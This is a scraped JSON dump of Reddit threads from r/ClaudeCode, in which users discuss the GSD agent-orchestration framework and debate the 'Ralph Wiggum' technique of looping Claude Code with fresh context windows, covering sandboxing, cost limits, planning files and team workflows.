          "text": "The new notifications on macOS are a miss IMO. Having a pop up in the middle of the screen and having to click on a button to dismiss them is bad UX. There is a terminal-notifier lib you could use to generate native pop up notifications like all other apps.",
          "score": 4,
          "created_utc": "2026-01-17 09:07:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o04zm12",
              "author": "officialtaches",
              "text": "Yah it sucked. I deleted it - check the latest update as it'll remove it on install. Will remove the remover after a while just wanted to make sure I cleared up the mess for anyone who installed.\n\nWill look into terminal-notifier - cheers :)",
              "score": 4,
              "created_utc": "2026-01-17 17:28:38",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o02tua9",
          "author": "Coldshalamov",
          "text": "So if I could give a suggestion for future design, I'd just like to see something implemented and maybe you'd dig where I'm coming from, maybe GSD is the right home for the feature because it's 85% of the way to what i've been working for.  \nWhat I would like is a manager agent that just wakes up on a timer like every hour or so, watches a folder with my notes where I'd just continuously make comments about  the development of my projects in canonical notes, the manager would break those notes down by project and update spec docs in a separate folder and make todo lists, and then spawn CLIs with something like GSD in each of my affected projects, requesting that edit summaries be provided back to a folder that functions as my inbox.\n\nThere's no reason why CC couldn't manage keeping track of my notes and decomposing them into task lists, it can run terminals, the terminal CLIs can perform the edits needed, and all I'd ever have to do is see updates on the dev logs and occasionally open up my projects and make notes about what I like and what I don't like.\n\nThat's something I've been working on on my end but I'm kind of reinventing the wheel when things like GSD already exist to do most of the decomposition, so I'm thinking about making the manager layer myself on top of GSD on my machine. i'm also working on a mobile app where I can talk to my terminal from my iphone which for me would close the loop if I had all that.",
          "score": 3,
          "created_utc": "2026-01-17 09:15:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o03j1a6",
          "author": "astanar",
          "text": "How does this compare to superpowers? Does it replace it?",
          "score": 3,
          "created_utc": "2026-01-17 12:56:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02ndaq",
          "author": "Coded_Kaa",
          "text": "Nice will definitely check it out today",
          "score": 2,
          "created_utc": "2026-01-17 08:14:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02p3xz",
              "author": "officialtaches",
              "text": "Enjoy!",
              "score": 1,
              "created_utc": "2026-01-17 08:31:09",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o02xkg6",
          "author": "Practical-Bell7581",
          "text": "Hey, I just started using your project a couple hours ago.  Can you give me any advice on this situation? I have an alpha of a project that I like, but want to rebuild it with stronger methodology. Right now Iâ€™m trying to figure out the appropriate time to inject in my personal knowledge and introduce the work I have done already, what skill would be best to do that etc. context: vibe coded in python, learned a lot of lessons, decided the project would greatly benefit from a hard typed highly opinionated language. Rebuilding in go. I have working python code but I want to make sure I donâ€™t bake in any of the â€œbadâ€ lessons from it. Anyway, the relevant code was slated by GSD for phase 1. \n\nIs gsd:discuss-phase 1 the right method for getting into a brainstorming session and creating strong useful documentation for the build process?",
          "score": 2,
          "created_utc": "2026-01-17 09:51:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0333q9",
          "author": "Miserable_Review_756",
          "text": "Does it work with codex or cc only?",
          "score": 2,
          "created_utc": "2026-01-17 10:43:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o039v07",
              "author": "corpa",
              "text": "Its cc only from what I know but there are some forks. At least I found one for opencode and its works there. I am thinking about getting a chatgpt subscription and use the gpt 5.2 with cc. I am already using GLM with cc to have a more cost effective model for implementation",
              "score": 3,
              "created_utc": "2026-01-17 11:44:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0336qr",
          "author": "Lazy_Polluter",
          "text": "Thanks for publishing.  I used your worklow for a large monorepo and it still works fantasticly. So this  isn't just for small projevts but works for feature development in existing projects just as well",
          "score": 2,
          "created_utc": "2026-01-17 10:43:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o035hcr",
          "author": "AdCommon2138",
          "text": "I don't know if you are using Jules but you should if you aren't. There is API endpoint so you could make it work overnight by spamming do thing.md which would iteratively work on some features you want.",
          "score": 2,
          "created_utc": "2026-01-17 11:05:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o038xyg",
          "author": "Hireswish",
          "text": "Excited for the new update. I have been using it on one of my projects to try it out since your first post about it. \n\nReally like the structure but it was just feeling a bit slow in some cases due to the numerous steps for each phase. If you have been able to speed it up, that sounds amazing, thank you!!",
          "score": 2,
          "created_utc": "2026-01-17 11:36:27",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o03u0ma",
          "author": "Mulct",
          "text": "Been using this and loving it so far, would love the option to execute multiple phases one after the other so itâ€™s kind of set and forget then come back and review once a certain checkpoint has been hit",
          "score": 2,
          "created_utc": "2026-01-17 14:03:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04l6wb",
          "author": "0xraghu",
          "text": "Hey u/officialtaches Thanks a lot for creating this framework.. It is helping me a lot with my workflow. I could just manual verify everything before moving to the next phase.. and it is so simple to understand too. Great work!\n\nI had a thought that could improve user experience with Claude Code. Why not show the GSD project metrics on Claude's Statusline?\n\nSo I created a PR for the same: [https://github.com/glittercowboy/get-shit-done/pull/73](https://github.com/glittercowboy/get-shit-done/pull/73) \n\n**Key highlights:**\n\n* Adds a quick setup command (/gsd:setup-statusline) that injects the integration into your .clauderc.\n* Tracks metrics in a metrics.json file (auto-generated for existing projects).\n* Supports customizable display styles (progress bars, minimal text, hacker vibes, etc.).\n\nWould be great to know your thoughts, feedback or comments!",
          "score": 2,
          "created_utc": "2026-01-17 16:21:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o05cwdj",
          "author": "ripitup2004",
          "text": "This is epic. Could this somehow be run using Google's Antigravity or is it a Claude Code only approach?",
          "score": 2,
          "created_utc": "2026-01-17 18:30:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o05sqsm",
          "author": "milanster",
          "text": "Any plans to make it work with opencode?",
          "score": 2,
          "created_utc": "2026-01-17 19:44:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o062uod",
          "author": "derekkddj",
          "text": "can I use it with opencode ?",
          "score": 2,
          "created_utc": "2026-01-17 20:35:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o06samn",
          "author": "angry_cactus",
          "text": "Impressive! Damn. The productivity is off the charts. Before we know it, GSD will self improve and evolve into its own AI model.",
          "score": 2,
          "created_utc": "2026-01-17 22:44:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09668o",
          "author": "Miserable_Review_756",
          "text": "How do I make it clear the context and continue going into the next phase over and over and over again until it's completed? Or does it stop every time a phase is complete?",
          "score": 2,
          "created_utc": "2026-01-18 07:24:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o09xry1",
              "author": "digitalml",
              "text": "This!! OP. Please add a YOLO mode. It should auto continue onto everything. If selections need to be made. Select everything and push on.",
              "score": 2,
              "created_utc": "2026-01-18 11:37:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o09si8y",
          "author": "Miserable_Review_756",
          "text": "Just some feedback bugbot is picking up: \n\n why so many bugs in the agents and the way they work? \n\n\n\nâº Good question. A few likely causes:\n\n\n\n  1. Multi-agent coordination without automated validation\n\n\n\n  These are markdown specification files, not code. There's no compiler catching when gsd-planner says \"DISCOVERY.md\" but gsd-phase-researcher writes \"RESEARCH.md\". Unlike code with tests, spec drift goes unnoticed until runtime.\n\n\n\n  2. Rapid iteration\n\n\n\n  The GSD system has many moving parts (planner, executor, researcher, synthesizer, checker, debugger, etc.) that evolved over time. New features get added to one agent without updating all the others that depend on it.\n\n\n\n  3. Copy-paste with incomplete updates\n\n\n\n  Most bugs followed this pattern:\n\n  \\- ${PHASE} vs ${PADDED\\_PHASE} - copied code, missed variable rename\n\n  \\- XX-name placeholders - copied from template, never made concrete\n\n  \\- human-action for auth gates - reused existing type instead of defining new one\n\n\n\n  4. No single source of truth\n\n\n\n  File naming conventions, checkpoint types, and path patterns are defined inline in each agent rather than in a shared reference. When something changes, you have to find-and-replace across 10+ files.\n\n\n\n  Potential improvements:\n\n  \\- Shared constants file that agents reference (file patterns, checkpoint types)\n\n  \\- Cross-agent validation script that checks producer/consumer contracts\n\n  \\- Integration tests that verify agent A's output matches agent B's expected input",
          "score": 2,
          "created_utc": "2026-01-18 10:49:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02ul17",
          "author": "Tight_Heron1730",
          "text": "Good work, I like that way. How do you keep your agents in track? They tend not to follow md. What did you use to keep them in line?",
          "score": 1,
          "created_utc": "2026-01-17 09:22:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o035567",
          "author": "Bidalos",
          "text": "Dude ! Great thanks, first time Im doing agentic coding and this is my first orchestrator I use... but damn it's good. Also using it with GLM 4.7 on CC !",
          "score": 1,
          "created_utc": "2026-01-17 11:01:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o036jt5",
          "author": "Lucky_Somewhere_9639",
          "text": "Thank you for creating this. I love it so much!",
          "score": 1,
          "created_utc": "2026-01-17 11:14:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o037nw3",
          "author": "HzRyan",
          "text": "you got another star! Looks amazing",
          "score": 1,
          "created_utc": "2026-01-17 11:24:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o040od0",
          "author": "dbliss",
          "text": "How does this compare something like Kiro with new context per task?",
          "score": 1,
          "created_utc": "2026-01-17 14:39:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04gxc1",
          "author": "CrypticViper_",
          "text": "I can't speak for GSD, but I just have to say that three of your prompts alone (create-prompt, run-prompt, whats-next) have genuinely been so awesome in getting my words into action. Thanks a ton for your good work!",
          "score": 1,
          "created_utc": "2026-01-17 16:01:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04kwf9",
          "author": "nitroedge",
          "text": "Great work Taches! I'm a fan and learned so much from you from your Bitwig adventures, sweet to see you code too!",
          "score": 1,
          "created_utc": "2026-01-17 16:20:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o058w7g",
          "author": "spinozasrobot",
          "text": "This looks fantastic as I've been slowly building my own solution as I learn how it works... you are miles ahead.\n\nQuestion, I prefer running CC in VSCode.  Is it possible to use GSD in VSCode?",
          "score": 1,
          "created_utc": "2026-01-17 18:11:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o05yjqd",
              "author": "BuildAISkills",
              "text": "Iâ€™m 99% sure you can. Try it.",
              "score": 1,
              "created_utc": "2026-01-17 20:13:53",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o05bmfz",
          "author": "BrowsingCoins",
          "text": "I was playing around with your plug-in freedom system (thanks for that but the way!) and wondering if you think gsd would work well inside that framework or even if switching to gsd you think would be better? Maybe some hybrid?",
          "score": 1,
          "created_utc": "2026-01-17 18:24:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o05e21x",
          "author": "shoe7525",
          "text": "Yo this is... Strikingly similar to my workflow: https://github.com/benjaminshoemaker/ai_coding_project_base\n\nAre you interested in taking contributions? It seems crazy to do this similar of work in parallel.",
          "score": 1,
          "created_utc": "2026-01-17 18:35:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o05ux6d",
          "author": "LargeDan",
          "text": "Doesnâ€™t CC use subagents by default if you tell it to though? How is this different?",
          "score": 1,
          "created_utc": "2026-01-17 19:55:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0d7rxa",
              "author": "flyryan",
              "text": "You should spend an hour using it and you'll see why. It's a better orchestrator and gives you the tools to manage context effectively without taking up a bunch of context itself when not using it.",
              "score": 1,
              "created_utc": "2026-01-18 22:05:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o05zzjz",
          "author": "TheSwissArmy",
          "text": "What plan do I need to be on to really make use of GSD? Iâ€™m only on Pro",
          "score": 1,
          "created_utc": "2026-01-17 20:21:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o073qec",
          "author": "ImJohnGalt",
          "text": "I'm keen to try this, but now that I've installed it, I get a SessionStart:startup hook error. Any idea why? Is it conflicting with something else?",
          "score": 1,
          "created_utc": "2026-01-17 23:43:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07odin",
          "author": "WhySoAn0n",
          "text": "Thank you for making my entire methodology useless <3.",
          "score": 1,
          "created_utc": "2026-01-18 01:31:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07q1cz",
          "author": "XenophonCydrome",
          "text": "Just wanted to say: incredible job pulling this all together in a nice self-contained package that doesn't add unnecessary complexity.\n\nI was essentially doing almost each of these phases of work-breakdown and verification loop with local git commits a few months ago but it was nowhere near as clean and token-efficient.\n\nOne of the most unique aspects that I love is the \"what should I do next\" paradigm with suggestions of the next slash command and the usage of the form-style elicitation menus. It is like you are an interviewer giving Claude a toy problem and it correctly comes up with clarifying questions to understand the problem's domain constraints.",
          "score": 1,
          "created_utc": "2026-01-18 01:40:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o08naou",
          "author": "Miserable_Review_756",
          "text": "Have i done something wrong here? u/officialtaches 9% context left... ? \n\nhttps://preview.redd.it/wah7n9kwg1eg1.png?width=905&format=png&auto=webp&s=5be1c57168e3d8be4786d667f38ff815f6249e07",
          "score": 1,
          "created_utc": "2026-01-18 04:53:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0a4ezp",
          "author": "HockeyDadNinja",
          "text": "How much of this has been on the head of the tree for the past week? I've been using GSD since last Sunday on a new project and it's been quite amazing and thorough.",
          "score": 1,
          "created_utc": "2026-01-18 12:32:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0a6c1o",
          "author": "dietcheese",
          "text": "Serious question: did you vibe code this entire project?",
          "score": 1,
          "created_utc": "2026-01-18 12:46:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0a77ws",
          "author": "Nice_Chicken_9927",
          "text": "can you add one more sub command specifically for reporting issue ? something like /gsd:report-issue 'description' and github issue related to that ?",
          "score": 1,
          "created_utc": "2026-01-18 12:53:35",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0anuld",
          "author": "Keblue",
          "text": "Can you make the subagents different models like sonnet or haiku?\n\nThis eats through tokens on a claude max 5x plan.",
          "score": 1,
          "created_utc": "2026-01-18 14:36:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0b4gbn",
          "author": "Maddy186",
          "text": "I'm curious, can this be adapted to codex and or antigravity?",
          "score": 1,
          "created_utc": "2026-01-18 16:00:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0f8oxf",
          "author": "HardChalice",
          "text": "Is a Claude Pro plan viable for this? I feel like I hit the limit super fast. Is everyone using this on a Max subscription or using the API? I like claude but for home ai-assisted side projects, I run into usages caps so quickly.",
          "score": 1,
          "created_utc": "2026-01-19 04:41:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02qxq2",
          "author": "corpa",
          "text": "Thanks for your work! Cant wait to try this out. I already did quite a bit with gsd and I enjoy it a lot. I really like the whole milestone/phases/plan loop.  \n\nI dont have claude max and my workflow is to create the phases/plans with claude opus in one terminal and in another terminal I am using my GLM sub with claude code to execute the plans and so far its working great.  \nI might switch to openai pro plan and try it with gpt 5.2 with claude code because I heard a lot of good things about gpts planning capabilities and you can get a lot more usage with it compared to opus.",
          "score": 1,
          "created_utc": "2026-01-17 08:48:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02rk62",
              "author": "officialtaches",
              "text": "Cheers brother! Highly recommend you update.\n\nHave you tried Claude Code Router?",
              "score": 1,
              "created_utc": "2026-01-17 08:54:01",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o02xf5i",
                  "author": "corpa",
                  "text": "No I didnt try this one. Thanks for the suggestion it looks interesting. I was wondering if you use some \"PR\"/code review agent for the changes that were implemented after the plan execution or even after a phase is completed?  \n\nI know that you get some manual testing suggestions after the plan is done to check if everything is working but I also didnt specify yet that I want to do unit tests or even e2e with e.g. playwright.  \n\nI tried a few times to review the latest plan implementation with a custom prompt to gemini pro that creates a code review md in the same format as the plan/summary files from gsd and it actually didnt really found much. I would say in 90% of my small test size it said the implemented code was good and included everything that was included in the plan.",
                  "score": 1,
                  "created_utc": "2026-01-17 09:49:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qc4vg0",
      "title": "TRUST ME BRO: Most people are running Ralph Wiggum wrong",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qc4vg0/trust_me_bro_most_people_are_running_ralph_wiggum/",
      "author": "trynagrub",
      "created_utc": "2026-01-13 22:03:31",
      "score": 213,
      "num_comments": 94,
      "upvote_ratio": 0.93,
      "text": "There's a lot of hype about Ralph Wiggum in the AI coding community, and I think most people are getting it wrong.\n\nFor those that don't know, Ralph is a way to run Claude Code (or any CLI agent) in a continuous loop so it keeps working instead of stopping too early. It's a simple but effective solution for a real limitation with AI coding tools.\n\nBut here's the thing. A lot of creators are hyping it up without covering the crucial parts: safety, efficiency, cost, validation, and the fundamental difference between the Claude Code plugin and the original bash loop.\n\n**The CC plugin vs the bash loop**\n\nThis is the part most people don't talk about. The official Claude Code Ralph plugin misses the point because it runs everything in a single context window and is triggered by a stop hook, yet the stop hook isn't even triggered at compaction. That means as tasks pile up, your context gets more bloated, more hallucinations, and I had to stop and manually compact mid-run anyway.\n\nThe original bash loop (from Geoffrey Huntley) starts a fresh context window each iteration. That's a fundamental difference and IMHO the bash loop is way better for actual long-running tasks (but since it runs headless, it can be a bit more difficult to set up/understand what's going on).\n\nBut regardless of running it via plugin or bash loop, the most important thing is how you set it up ahead of time. This is how I approach it:\n\n1. **Safety:** Use a sandbox. You want to give the agent permissions without babysitting it, but you also don't want it nuking your system. Sandbox lets you run yolo mode the right way.\n2. **Efficiency:** Have a plan.md and activity.md set up. You don't want Ralph making ambiguous decisions. Give it a clear task list it can follow and update. I format mine based on Anthropic's \"effective harnesses for long-running agents\" post. Also USE GIT.\n3. **Cost:** Set max iterations. The plugin defaults to unlimited. I start with 10-20 and go from there.\n4. **Feedback loop:** Give it access to Playwright (for headless) or Claude for Chrome so it can actually verify its own work. Screenshots, console logs, the whole thing.\n\nI made a full video walkthrough and also put together a GitHub guide with all the configs and scripts: \\[both links in comments\\]\n\nBTW I have tried modifying my prompt or even the CC skill for Ralph to force a clean loop, but it's problematic.\n\n**Bottom line:** if you're not gonna use the bash loop, don't use the Claude Code plugin.\n\nI have spoken.\n\nYoutube Walkthrough:Â [https://youtu.be/eAtvoGlpeRU](https://youtu.be/eAtvoGlpeRU)  \nGithub Guide:Â [https://github.com/JeredBlu/guides/blob/main/Ralph\\_Wiggum\\_Guide.md](https://github.com/JeredBlu/guides/blob/main/Ralph_Wiggum_Guide.md)\n\nEDIT: Added Link",
      "is_original_content": false,
      "link_flair_text": "Tutorial / Guide",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qc4vg0/trust_me_bro_most_people_are_running_ralph_wiggum/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nzflpbr",
          "author": "scodgey",
          "text": "Honestly the actual starting point for these is by watching the wizard himself Geoffrey Huntley talk through it tbh",
          "score": 37,
          "created_utc": "2026-01-13 22:16:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfnqft",
              "author": "qa_anaaq",
              "text": "Link?",
              "score": 7,
              "created_utc": "2026-01-13 22:26:11",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzfph96",
                  "author": "scodgey",
                  "text": "https://youtu.be/O2bBWDoxO4s?si=VEgTWPkw6Onqq__q\n\nThere's more on his channel too.",
                  "score": 12,
                  "created_utc": "2026-01-13 22:34:48",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nziqayh",
                  "author": "MaartenHus",
                  "text": "[https://www.youtube.com/watch?v=SB6cO97tfiY](https://www.youtube.com/watch?v=SB6cO97tfiY) On this one you can see the coders screen better.",
                  "score": 3,
                  "created_utc": "2026-01-14 11:08:37",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzfoyzg",
              "author": "exitcactus",
              "text": "Yes please some links",
              "score": 2,
              "created_utc": "2026-01-13 22:32:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzfpi4n",
                  "author": "scodgey",
                  "text": "Linked above!",
                  "score": 2,
                  "created_utc": "2026-01-13 22:34:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzfrgsq",
              "author": "miqcie",
              "text": "Heard him on a livestream earlier today. Felt like a prophet telling us our future",
              "score": 2,
              "created_utc": "2026-01-13 22:44:45",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o07cood",
              "author": "aaronhall",
              "text": "[https://www.youtube.com/watch?v=\\_IK18goX4X8](https://www.youtube.com/watch?v=_IK18goX4X8)\n\nI found this 16 min. video by Matt Pocock very helpful to understand the concept, including its brilliance and simplicity.",
              "score": 2,
              "created_utc": "2026-01-18 00:30:36",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfo14w",
          "author": "waflynn",
          "text": "An important thing to know about Ralph is that, at least when he created him, Geoffrey Huntley was getting all his tokens for free",
          "score": 27,
          "created_utc": "2026-01-13 22:27:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfqexl",
              "author": "HaxleRose",
              "text": "True, you have to watch it when you are on the max 20 plan. Itâ€™ll eat up your usage before the week ends if youâ€™re not careful!",
              "score": 6,
              "created_utc": "2026-01-13 22:39:28",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzhg1md",
                  "author": "deadcoder0904",
                  "text": "Easy, use the Chinese models to run it or OpenAI's open-source one.",
                  "score": 2,
                  "created_utc": "2026-01-14 04:27:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzfob7u",
          "author": "Careless_Bat_9226",
          "text": "I mean, ultimately, I just wonder if people who are doing this are not doing very difficult, complicated work or working on a team:\n\n* are they just going to submit a mega PR with all the changes that CC made working overnight? My team would tell me to go to hell.\n* what if is Claude Code makes a mistake early on and then that mistake just compounds as everything build on that mistake?\n* how do they think through and give feedback for more challenging problems?\n\nI get it might work if you're a solo develop just building a vanilla web app.",
          "score": 16,
          "created_utc": "2026-01-13 22:29:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfpn2e",
              "author": "randombsname1",
              "text": "This is what im curious about too. I dont really get how this works, but I assume it only works on (currently) a very selective subset of coding problems. \n\n\nClaude 4.5 Opus and CC is the first model / toolchain that is capable of working effectively in STM32 repos (mostly C and Assembly) that i have tried, but there isnt a chance in hell I would ever let it work more than half a context window by itself for my current tasks. I have to to rein it in pretty aggressively else it doesnt do a whole lot, but again -- that's fair because no other model/harness does anything, lol.",
              "score": 5,
              "created_utc": "2026-01-13 22:35:36",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzfrgc4",
              "author": "StunningBank",
              "text": "1. Separate tasks go into separate PR. Split work beforehand with Claude code to make it non-conflicting. Or instruct it to merge one PR before starting next task if you are fine with that. \n2. Write specs, setup baseline tests, integration tests, etc. whatever will ensure it follows plan and has a way to check everything is going fine. \n3. You get PRs, you can review them and run task again with your comments to get it fixed. Just like with your coworkers.\n\nI mean itâ€™s not fully automated. Itâ€™s rather like you have a team of â€œdevelopersâ€ you manage and review. It never was a simple job to do but it still increases your performance.\n\nP.S. I have tested just a single PR workflow, not fully automated way of doing multiple in containers. Just planning to set it up in nearest future :)",
              "score": 3,
              "created_utc": "2026-01-13 22:44:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzfv37x",
                  "author": "Careless_Bat_9226",
                  "text": "My responses would be:\n\n1. it's pretty hard for PRs to be non-conflicting unless they're completely unrelated. Usually though I'm working on 1-3 general projects so the PRs in a project will build off of each other. PRs have to get reviewed and potentially modified from review so that's going to block the AI from going further.\n2. again I think that works better when you're doing pretty basic work but complicated work it's hard to foresee every challenge and write every test ahead of time\n3. But your coworkers have to review the PRs\n\nYeah so it sounds like this is all good if you don't actually work with a team or in a complicated codebase but if you're just developing an app on your own then it's all good.",
                  "score": 4,
                  "created_utc": "2026-01-13 23:03:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzgsckv",
              "author": "IlliterateJedi",
              "text": "> what if is Claude Code makes a mistake early on and then that mistake just compounds as everything build on that mistake?\n\n\"Well, I guess this is how we're doing this now.  Not what I had in mind, but Claude has decided for us and it's too late to go back now.\"",
              "score": 3,
              "created_utc": "2026-01-14 02:06:27",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzltk50",
                  "author": "Weird_Welder_9080",
                  "text": "this is literally a universal problem for all the AI automation tools I used. Sometimes the AI thread started in a wrong direction, but it just keeps digging in, dig the hole bigger, generate more code almost in panic mode. At the end, the whole thread, regardless how much token it used, could not go anywhere, needs to be shutdown and restart. the worst part of this is, if the automation is built into an actual working environment, the amount of changes, trash garbage code, configurations it added requires extensive human labor to clean up. However, I am not an AI expert, maybe AI agent just occasionally play a joke.",
                  "score": 1,
                  "created_utc": "2026-01-14 20:37:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzfwzlu",
              "author": "BootyLavaFlow",
              "text": "I put Claude in tmpfs and don't give it exec permissions. Basically I do a code review and build it on my own between each step.    \n     \nI can't imagine going any faster and still *actually* knowing your code",
              "score": 4,
              "created_utc": "2026-01-13 23:13:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzg3dcv",
                  "author": "belheaven",
                  "text": "Newbies",
                  "score": 2,
                  "created_utc": "2026-01-13 23:47:39",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzkbez3",
              "author": "TechnicalGeologist99",
              "text": "I'm in the same mind....this removes the expert from the part of the loop where their guidance is the most important. \n\nI think Ralph is hype.",
              "score": 2,
              "created_utc": "2026-01-14 16:33:39",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzkl2o2",
              "author": "Deathspiral222",
              "text": "You can give claude a plan file and tell it to make a new branch (in a stack) for each item in the list. You can also tell it to read the PR from github if you use an automated reviewer like greptile and to fix any issues and propagate them up the stack.\n\nTotally agree on the mistake thing. I've found having a validation agent to be super helpful here.",
              "score": 1,
              "created_utc": "2026-01-14 17:17:27",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzm7e3f",
              "author": "HelpRespawnedAsDee",
              "text": "I haven't tried this yet, but I can see it useful for experimental features and especially for automated testing. I'm experimenting combining build scripts and maestro for mobile qa testing, where the utility of a ralph loop would be having an agent build, run, create and adapt tests by itself.",
              "score": 1,
              "created_utc": "2026-01-14 21:39:54",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzflqwf",
          "author": "tqwhite2",
          "text": "I have not been able to quite understand this. As a person who works with claude to write thorough plans, I don't have any problem convincing claude to work through to the end of the project. It's true that I start the plan with the instruction that claude is supposed to implement all of the phases through to the end but, that works fine.\n\nI have been trying to understand what the Ralph plugin does better than that.\n\nPlease explain.",
          "score": 8,
          "created_utc": "2026-01-13 22:16:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfox8k",
              "author": "BigKozman",
              "text": "As you work in Claude into a big feature or plan, session quality degrades as context compression moves forward. Eventually it loses track of the original plan or some of the important things to focus on.\nWith the original bash loop, Claude has a list of tasks to keep track of in file and clear prompt with each task when completed to update its progress as well as any related updates to the backlog then it starts a fresh session, injecting the prompt again and looking at the backlog file to start a new task after getting all the important info on what was done without compression or losing context.\n\nThe real trick is in looping into the tasks or PRD files and updating it with every task being done.",
              "score": 3,
              "created_utc": "2026-01-13 22:32:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o05c791",
                  "author": "tqwhite2",
                  "text": "Maybe the reason that I have more success is that I do not rely on Claude to control the process. I almost always have a separate plan document that it is following. Maybe that's the reason I don't have a problem.\n\nI still don't understand what Ralph is doing.",
                  "score": 2,
                  "created_utc": "2026-01-17 18:27:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzfq8at",
              "author": "HaxleRose",
              "text": "What the Ralph bash loop does (not the plug-in) is start a fresh context window before implementing each step of your plan. That way you get the best performance since the context is very focused each time. So itâ€™s great that youâ€™ve got a thorough plan. Next you want to have it implement that plan step at a time with one step every loop. You also want to have specification files that are read into the context every loop. That way it knows exactly how the app is supposed to work in every scenario. Then it will make the right decisions on how to proceed.",
              "score": 2,
              "created_utc": "2026-01-13 22:38:32",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o05fji0",
                  "author": "tqwhite2",
                  "text": "Coolness. Thanks. This makes sense to me.",
                  "score": 2,
                  "created_utc": "2026-01-17 18:42:23",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o02p35x",
                  "author": "Hooftly",
                  "text": "Lolol this is what Kiro from Amazon (AI IDE with claude) does. No ralph loop required",
                  "score": 1,
                  "created_utc": "2026-01-17 08:30:57",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o03qlca",
                  "author": "RemarkableGuidance44",
                  "text": "I built my own and it only took about an hour.... No other bloat needed...",
                  "score": 1,
                  "created_utc": "2026-01-17 13:44:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzolp2b",
              "author": "Swimming_Internet402",
              "text": "The thing is that you skip all the constant back end forth forever fighting the AI to do the right thing. Ralph loops solves that. I like the zeroshot even better though",
              "score": 1,
              "created_utc": "2026-01-15 06:00:14",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
